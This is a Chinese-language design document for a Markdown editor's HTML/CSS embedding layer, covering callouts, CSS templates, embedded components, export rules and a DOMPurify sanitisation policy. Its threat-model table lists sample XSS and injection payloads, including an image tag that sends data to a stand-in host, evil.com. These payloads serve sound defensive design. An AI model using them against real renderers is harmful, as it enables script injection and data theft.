# Markdown 编辑器 v3.5 — 富表现力与 HTML/CSS 嵌入设计

> **核心问题**：Markdown 作为一种文档格式，在表现力上有天然局限。如何在保持 Markdown 简洁性和可移植性的前提下，让文档具备丰富的视觉表现力？
>
> **设计哲学**：**Markdown 是默认值，HTML/CSS 是增强层**。基础内容用 Markdown 写，视觉效果用 CSS 点缀，交互和富媒体用嵌入组件实现。三层叠加，优雅降级。

---

## 0. 核心判断：Markdown 需要什么样的富表现力？

### 0.1 用户需求分层

| 层次 | 用户期望 | 当前 Markdown | 目标 |
|------|----------|--------------|------|
| **内容** | 写文字、列表、标题 | ✅ 完美 | 保持 |
| **结构** | 表格、引用、代码 | ✅ 够用 | 增强（WYSIWYG 编辑） |
| **样式** | 颜色、强调、布局 | ⚠️ 有限 | **CSS 自定义属性 + 主题** |
| **视觉** | 卡片、横幅、分栏 | ❌ 不支持 | **嵌入 HTML/CSS 块** |
| **交互** | 折叠、标签、按钮 | ❌ 不支持 | **安全子集嵌入** |
| **动态** | 数据可视化、实时内容 | ❌ 不支持 | **动态内容块** |

### 0.2 设计原则

```
┌─────────────────────────────────────────────────────────────┐
│  纯 Markdown 写作 → 100% 可移植，任何编辑器都能打开         │
│  + CSS 类名标注 → 在本编辑器中渲染为丰富样式               │
│  + 嵌入 HTML 块 → 在本编辑器中渲染为富视觉组件             │
│  + 嵌入交互组件 → 在本编辑器中渲染为可交互元素             │
│                                                             │
│  导出时：                                                    │
│  → 导出 Markdown：所有增强层自动剥离，保持纯净              │
│  → 导出 HTML：所有增强层完整渲染                            │
│  → 导出 PDF：所有增强层完整渲染                             │
│  → 导出 PNG：所有增强层完整渲染                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 1. 安全模型：HTML/CSS 嵌入的安全边界

### 1.1 安全威胁模型

根据安全研究（DOMPurify + marked 安全指南），Markdown 中的 HTML 有以下攻击面：

| 攻击向量 | 示例 | 防御 |
|----------|------|------|
| 脚本注入 | `<img onerror=alert(1) src=x>` | DOMPurify 移除事件属性 |
| JS 链接 | `[click](javascript:alert(1))` | URL scheme 白名单 |
| CSS 注入 | `<style>*{display:none}</style>` | 移除 `<style>` 标签或 CSP |
| 表单钓鱼 | `<form action=evil.com>` | 移除 `<form>` 标签 |
| DOM 篡改 | `<a name="cookie">` | SANITIZE_NAMED_PROPS |
| 数据外泄 | `<img src=evil.com/steal?data=...>` | img-src CSP |

### 1.2 我们的安全策略

**核心原则**：`@md-bundle/renderer` 已有 DOMPurify，在此基础上扩展允许列表。

```
安全层级：
  Layer 0（默认）：纯 Markdown，DOMPurify 默认白名单
  Layer 1（CSS 类名）：允许特定 class 和 style 属性
  Layer 2（嵌入 HTML）：允许安全的 HTML 子集（div/span/details/summary）
  Layer 3（嵌入组件）：允许注册的组件（图表/卡片/横幅）
```

### 1.3 DOMPurify 配置

```typescript
// 扩展的允许列表配置
const RICH_RENDER_CONFIG = {
  // 在默认白名单基础上添加
  ADD_TAGS: [
    'details', 'summary',    // 折叠块
    'mark', 'ins', 'del',   // 文本标注
    'figure', 'figcaption', // 图文组合
    'kbd',                  // 键盘按键
  ],
  ADD_ATTR: [
    'class',                // CSS 类名（核心！）
    'open',                 // details 展开状态
    'data-*',               // 数据属性（组件用）
  ],
  // URL 白名单
  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#|data:image\/)/i,
  // 禁止的危险标签
  FORBID_TAGS: ['script', 'style', 'form', 'input', 'iframe', 'object', 'embed'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
}
```

---

## 2. 三层增强模型

### 2.1 Layer 1：CSS 类名标注（最轻量）

**概念**：通过 Markdown 的 HTML 属性语法或特殊标注，为块添加 CSS 类名，渲染时应用预设样式。

**语法选择**：

| 方案 | 语法 | 优点 | 缺点 |
|------|------|------|------|
| A. 行内 HTML `<div class="banner">` | 标准 HTML | 冗长，破坏可读性 |
| B. 属性标注 `{:.banner}` | Pandoc 风格 | 简洁，但非标准 |
| C. Callout 扩展 `> [!banner]` | Obsidian 风格 | 语义化，但需要解析器扩展 |
| D. 注释标注 `<!-- class:banner -->` | 自定义 | 纯注释，导出时易剥离 |

**推荐方案：C + D 组合**

```markdown
<!-- 方案 C：Callout 语法（已有基础，扩展） -->
> [!info] 提示
> 这是一个信息提示块，带图标和颜色

> [!warning] 警告
> 这是一个警告块

> [!success] 完成
> 这是一个成功提示

> [!danger] 危险
> 这是一个危险警告

<!-- 方案 D：CSS 类标注（用于非 callout 场景） -->
<!-- class:hero-banner -->
# 欢迎来到我们的平台

<!-- class:two-column -->
:::column
## 左侧内容
这是左侧的内容
:::
:::column
## 右侧内容
这是右侧的内容
:::
```

**CSS 样式系统**：

```css
/* 设计令牌 — 与现有 themeTokens 对齐 */
:root {
  /* 语义色 */
  --md-info: var(--primary);
  --md-success: var(--success);
  --md-warning: var(--warning);
  --md-danger: var(--danger);

  /* 卡片 */
  --md-card-radius: 12px;
  --md-card-padding: 20px;
  --md-card-shadow: 0 2px 8px var(--shadow);

  /* 间距 */
  --md-gap-sm: 8px;
  --md-gap-md: 16px;
  --md-gap-lg: 24px;
}

/* Callout 样式 */
.callout {
  border-radius: var(--md-card-radius);
  padding: var(--md-card-padding);
  margin: 16px 0;
  border-left: 4px solid var(--md-info);
  background: color-mix(in oklab, var(--md-info) 8%, transparent);
}
.callout-info { border-left-color: var(--md-info); }
.callout-success { border-left-color: var(--md-success); }
.callout-warning { border-left-color: var(--md-warning); }
.callout-danger { border-left-color: var(--md-danger); }

/* 布局组件 */
.md-two-column {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: var(--md-gap-lg);
}
.md-three-column {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: var(--md-gap-lg);
}

/* Hero Banner */
.md-hero {
  text-align: center;
  padding: 48px 32px;
  background: linear-gradient(135deg, var(--primary) 0%, var(--primary-hover) 100%);
  color: white;
  border-radius: var(--md-card-radius);
}

/* 卡片 */
.md-card {
  border-radius: var(--md-card-radius);
  padding: var(--md-card-padding);
  box-shadow: var(--md-card-shadow);
  border: 1px solid var(--border);
}

/* 折叠块（details/summary 原生） */
.md-collapse {
  border: 1px solid var(--border);
  border-radius: 8px;
  overflow: hidden;
}
.md-collapse summary {
  padding: 12px 16px;
  cursor: pointer;
  font-weight: 600;
}
```

### 2.2 Layer 2：嵌入 HTML 块（中等重量）

**概念**：允许在 Markdown 中嵌入安全的 HTML 块，渲染时保留 HTML 结构，导出 Markdown 时剥离或转义。

**安全约束**：

```
允许的 HTML 标签：
  结构：div, section, article, aside, header, footer, main
  文本：span, p, br, hr, mark, ins, del, kbd, samp, var
  列表：ul, ol, li（嵌套）
  媒体：img, figure, figcaption, svg（内联）
  交互：details, summary（折叠）
  表格：table, thead, tbody, tr, th, td（GFM 表格的 HTML 版）

禁止的 HTML 标签：
  script, style, form, input, button, iframe, object, embed, link

允许的 HTML 属性：
  class, id, data-*, title, role, aria-*, open
  style（仅限 CSS 自定义属性值，如 --md-*）

禁止的 HTML 属性：
  所有 on* 事件处理器
  style 中的 expression/behavior/url(javascript:)
```

**使用示例**：

```markdown
<!-- 彩色高亮文本 -->
这是一段文字，<mark>这里是高亮部分</mark>，继续正常文字。

<!-- 键盘快捷键提示 -->
按 <kbd>Ctrl</kbd> + <kbd>S</kbd> 保存文档。

<!-- 折叠内容 -->
<details>
<summary>点击展开详细说明</summary>

这里是折叠的内容，可以包含 **Markdown** 语法。

- 列表项 1
- 列表项 2

</details>

<!-- 提示卡片 -->
<div class="md-card md-card-info">

### 💡 使用提示
这个功能可以帮助你快速完成常见任务。

</div>

<!-- 两栏布局 -->
<div class="md-two-column">

<div>

### 方案 A
- 优点：简单
- 缺点：功能少

</div>

<div>

### 方案 B
- 优点：功能丰富
- 缺点：复杂度高

</div>

</div>
```

### 2.3 Layer 3：嵌入组件（重量级）

**概念**：通过自定义语法或 HTML 标签，嵌入可交互的富组件。

**组件注册机制**：

```typescript
interface EmbeddedComponent {
  name: string           // 组件标识
  tag: string            // HTML 标签名
  allowedProps: string[] // 允许的属性
  render: (props: Record<string, string>, children: string) => string
}

// 注册的内置组件
const builtinComponents: EmbeddedComponent[] = [
  { name: 'card', tag: 'md-card', allowedProps: ['variant', 'icon', 'title'] },
  { name: 'banner', tag: 'md-banner', allowedProps: ['variant', 'gradient'] },
  { name: 'tabs', tag: 'md-tabs', allowedProps: ['labels'] },
  { name: 'tab', tag: 'md-tab', allowedProps: ['label'] },
  { name: 'collapse', tag: 'md-collapse', allowedProps: ['title', 'open'] },
  { name: 'progress', tag: 'md-progress', allowedProps: ['value', 'max', 'label'] },
  { name: 'badge', tag: 'md-badge', allowedProps: ['variant', 'label'] },
]
```

**使用示例**：

```markdown
<!-- 标签页 -->
<md-tabs labels="Mac|Windows|Linux">

<md-tab label="Mac">
```bash
brew install md-bundle
```
</md-tab>

<md-tab label="Windows">
```powershell
winget install md-bundle
```
</md-tab>

<md-tab label="Linux">
```bash
sudo snap install md-bundle
```
</md-tab>

</md-tabs>

<!-- 进度条 -->
<md-progress value="75" max="100" label="完成度" />

<!-- 徽章 -->
状态：<md-badge variant="success" label="已完成" /> <md-badge variant="warning" label="进行中" />
```

---

## 3. 视觉设计系统

### 3.1 预设视觉模板

为了让用户不需要手写 CSS，提供一套预设的视觉模板：

| 模板 | 用途 | 触发方式 |
|------|------|----------|
| **Hero Banner** | 文章头部/宣传横幅 | `<!-- class:hero -->` |
| **Feature Card** | 功能介绍卡片 | `<!-- class:feature-card -->` |
| **Comparison** | 两栏/三栏对比 | `<!-- class:compare-2 -->` |
| **Timeline** | 时间线/路线图 | `<!-- class:timeline -->` |
| **Quote Card** | 引用卡片 | `<!-- class:quote-card -->` |
| **Stat Counter** | 数据展示 | `<!-- class:stat-card -->` |
| **CTA Block** | 行动号召 | `<!-- class:cta -->` |
| **Code Showcase** | 代码展示（带标题/语言标签） | `<!-- class:code-showcase -->` |

### 3.2 视觉模板示例

```markdown
<!-- Hero Banner -->
<!-- class:hero-banner -->
# 🚀 MD-Bundle
## 把图片、附件打包进一个 .mdpkg 文件
[开始使用] [了解更多]

---

<!-- Feature Cards -->
<!-- class:feature-grid -->
<!-- cards:3 -->

<div class="md-card">
### 📦 自包含
所有资源打包进一个文件，分享不再裂图
</div>

<div class="md-card">
### 🎨 所见即所得
Typora 式编辑体验，底层永远是标准 Markdown
</div>

<div class="md-card">
### 🔒 本地优先
纯前端运行，文档永不离开你的设备
</div>

---

<!-- Comparison Table -->
<!-- class:comparison -->
| | MD-Bundle | 传统 MD | 在线工具 |
|---|---|---|---|
| 图片内嵌 | ✅ | ❌ | ⚠️ 部分 |
| 离线使用 | ✅ | ✅ | ❌ |
| 导出 PNG | ✅ | ❌ | ✅ |
| 源码保真 | 100% | 100% | ⚠️ 有损 |
| 隐私 | 本地 | 本地 | 上传云端 |

---

<!-- Timeline -->
<!-- class:timeline -->
<div class="md-timeline">

<div class="md-timeline-item done">
### v1.0 基础编辑
✅ 所见即所得编辑 · 三模式切换 · 图片导入
</div>

<div class="md-timeline-item active">
### v2.0 富表现力
🔄 HTML/CSS 嵌入 · 视觉模板 · 语义画布
</div>

<div class="md-timeline-item">
### v3.0 AI 协作
⏳ 意图引擎 · AI 共写 · 流式编辑
</div>

</div>
```

### 3.3 主题适配

所有视觉组件自动适配 dark/light 主题：

```css
/* 使用 CSS color-mix 自动适配 */
.md-card {
  background: color-mix(in oklab, var(--text) 4%, var(--bg));
  border: 1px solid var(--border);
  color: var(--text);
}

/* 或使用 light-dark() */
.md-hero {
  background: light-dark(
    linear-gradient(135deg, #4f5ad1 0%, #5a66d8 100%),
    linear-gradient(135deg, #7b86ea 0%, #6671e0 100%)
  );
}
```

---

## 4. 编辑器中的实时预览

### 4.1 编辑态中的 HTML/CSS 渲染

```
┌─────────────────────────────────────────────────────────────┐
│ 编辑态（语义编辑态）                                         │
│                                                             │
│  纯 Markdown 内容 → 语义化渲染（同 v3）                     │
│                                                             │
│  <!-- class:hero-banner -->                                │
│  # 标题                                                     │
│  → 实时渲染为 Hero Banner 样式（带背景色/居中/大字号）      │
│                                                             │
│  <div class="md-two-column">                               │
│  → 实时渲染为两栏布局                                        │
│  → 可直接在栏内编辑                                          │
│                                                             │
│  <details>                                                 │
│  → 实时渲染为折叠块                                          │
│  → 可点击展开/收起                                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 4.2 HTML 块的编辑体验

**问题**：HTML 块在语义编辑态中如何编辑？

**方案**：

| 场景 | 编辑体验 |
|------|----------|
| Callout（`> [!info]`） | 直接编辑内容，callout 样式实时渲染 |
| CSS 类标注（`<!-- class:x -->`） | 注释不可见，内容按标注样式渲染 |
| 嵌入 HTML 块 | 点击展开源码编辑，失焦渲染 |
| 嵌入组件 | 属性面板编辑，内容区域直接编辑 |

**嵌入 HTML 块的交互**：

```
默认状态（渲染态）：
┌──────────────────────────────────────┐
│ 💡 这是一个提示卡片                   │
│ 这里是可以直接编辑的内容              │
│ 支持 **Markdown** 语法                │
└──────────────────────────────────────┘
  ↕ 点击编辑按钮或双击

编辑状态（源码态）：
┌──────────────────────────────────────┐
│ <div class="md-card md-card-info">   │
│ ### 💡 这是一个提示卡片               │
│ 这里是可以直接编辑的内容              │
│ 支持 **Markdown** 语法                │
│ </div>                               │
└──────────────────────────────────────┘
  ↕ 失焦或点击完成
```

---

## 5. 导出策略

### 5.1 导出 Markdown（纯净模式）

所有增强层自动剥离：

```markdown
<!-- 输入（编辑器内） -->
<!-- class:hero-banner -->
# 🚀 欢迎使用

> [!info] 提示
> 这是一个信息块

<!-- 导出 Markdown -->
# 🚀 欢迎使用

> [!info] 提示
> 这是一个信息块
```

**剥离规则**：
- `<!-- class:... -->` 注释 → 移除
- `<!-- class:xxx -->` 后的内容 → 保留（纯 Markdown 部分）
- 嵌入 HTML 块 → 尝试转为 Markdown（如果可能），否则保留 HTML
- 嵌入组件 → 转为纯 Markdown 等价物（如 tabs → 列表）

### 5.2 导出 HTML/PDF/PNG（富渲染模式）

所有增强层完整渲染：

```html
<!-- 导出 HTML -->
<section class="md-hero">
  <h1>🚀 欢迎使用</h1>
</section>

<div class="callout callout-info">
  <div class="callout-title">提示</div>
  <div class="callout-content">这是一个信息块</div>
</div>
```

### 5.3 导出策略矩阵

| 导出格式 | Callout | CSS 类 | HTML 块 | 嵌入组件 |
|----------|---------|--------|---------|----------|
| .md | 保留语法 | 剥离注释 | 转 Markdown/保留 | 转 Markdown |
| .html | 渲染为 div | 渲染为样式 | 保留 HTML | 渲染为组件 |
| .pdf | 渲染为样式 | 渲染为样式 | 保留 HTML | 渲染为组件 |
| .png | 渲染为样式 | 渲染为样式 | 保留 HTML | 渲染为组件 |
| .mdpkg | 全部保留 | 全部保留 | 全部保留 | 全部保留 |

---

## 6. 视觉模板库（预设样式清单）

### 6.1 内容强调类

| 名称 | 语法 | 效果 |
|------|------|------|
| Info Callout | `> [!info]` | 蓝色左边框 + ℹ️ 图标 |
| Tip Callout | `> [!tip]` | 绿色左边框 + 💡 图标 |
| Warning Callout | `> [!warning]` | 黄色左边框 + ⚠️ 图标 |
| Danger Callout | `> [!danger]` | 红色左边框 + 🛑 图标 |
| Success Callout | `> [!success]` | 绿色左边框 + ✅ 图标 |
| Quote Card | `<!-- class:quote-card -->` | 大字号斜体 + 侧边竖线 |

### 6.2 布局类

| 名称 | 语法 | 效果 |
|------|------|------|
| 两栏 | `<!-- class:col-2 -->` | 50/50 网格 |
| 三栏 | `<!-- class:col-3 -->` | 33/33/33 网格 |
| 左大右小 | `<!-- class:col-2-1 -->` | 66/33 网格 |
| 等分卡片 | `<!-- class:card-grid cards:3 -->` | 等宽卡片网格 |

### 6.3 特殊组件类

| 名称 | 语法 | 效果 |
|------|------|------|
| Hero Banner | `<!-- class:hero -->` | 居中 + 渐变背景 + 大标题 |
| Feature Card | `<!-- class:feature -->` | 图标 + 标题 + 描述 |
| Stat Counter | `<!-- class:stat -->` | 大字数字 + 标签 |
| Timeline | `<!-- class:timeline -->` | 时间线 + 圆点 + 连线 |
| CTA Block | `<!-- class:cta -->` | 行动号召 + 按钮样式 |
| Code Showcase | `<!-- class:code-showcase -->` | 代码块 + 标题栏 + 复制按钮 |

---

## 7. 与 v3 方案的关系

### 7.1 架构整合

```
v3 四层架构 + v3.5 富表现力层：

┌─────────────────────────────────────────────────────────────┐
│  Layer 4: AI 协作层                                         │
│  ├─ 意图引擎 · AI 共写 · 文档指纹 · 流式 AI 建议           │
├─────────────────────────────────────────────────────────────┤
│  Layer 3: 语义层                                            │
│  ├─ 块模型 · 语义画布 · 意图注释 · 动态内容块              │
│  ├─ ★ CSS 类名标注（新增）                                  │
│  └─ ★ 嵌入组件注册表（新增）                                │
├─────────────────────────────────────────────────────────────┤
│  Layer 2: 编辑层                                            │
│  ├─ 渐进式语法揭示 · 块级操作 · 上下文工具栏               │
│  ├─ 智能输入 · WYSIWYG 表格 · 命令面板                     │
│  └─ ★ HTML 块编辑/渲染（新增）                              │
├─────────────────────────────────────────────────────────────┤
│  Layer 1: 基础层                                            │
│  ├─ CodeMirror 6 · @md-bundle/renderer · 图片/导出         │
│  └─ ★ DOMPurify 扩展配置（新增）                            │
└─────────────────────────────────────────────────────────────┘
```

### 7.2 实施优先级

| Phase | 内容 | 工期 |
|-------|------|------|
| Phase 2.5 | Callout 扩展（12+ 类型）+ CSS 类标注 | 2 周 |
| Phase 3.5 | 视觉模板库 + 预设样式系统 | 2 周 |
| Phase 4.5 | HTML 块安全嵌入 + 编辑体验 | 3 周 |
| Phase 5.5 | 嵌入组件系统 + 组件注册表 | 3 周 |

---

## 8. 总结

### 8.1 核心设计决策

1. **Markdown 是默认值，增强是可选层** — 纯 Markdown 写作永远可用
2. **CSS 类名是最轻量的增强** — 一行注释即可获得丰富样式
3. **HTML 嵌入是安全子集** — DOMPurify 白名单 + 禁止危险标签
4. **视觉模板降低使用门槛** — 不需要手写 CSS
5. **导出时优雅降级** — 导出 Markdown 剥离增强，导出 HTML/PDF 完整渲染

### 8.2 与竞品的差异化

| 维度 | 豆包 | Obsidian | Typora | 我们 |
|------|------|----------|--------|------|
| HTML 嵌入 | ❌ | ⚠️ CSS Snippets | ⚠️ 有限 | ✅ 安全子集 + 实时渲染 |
| CSS 自定义 | ❌ | ✅ CSS Snippets | ✅ 主题 | ✅ 类名标注 + 模板库 |
| 视觉模板 | ❌ | ⚠️ 插件 | ❌ | ✅ 预设模板库 |
| 导出保真 | ⚠️ | ⚠️ | ⚠️ | ✅ 同源渲染 |
| 安全模型 | 未知 | 本地信任 | 本地信任 | DOMPurify + CSP |
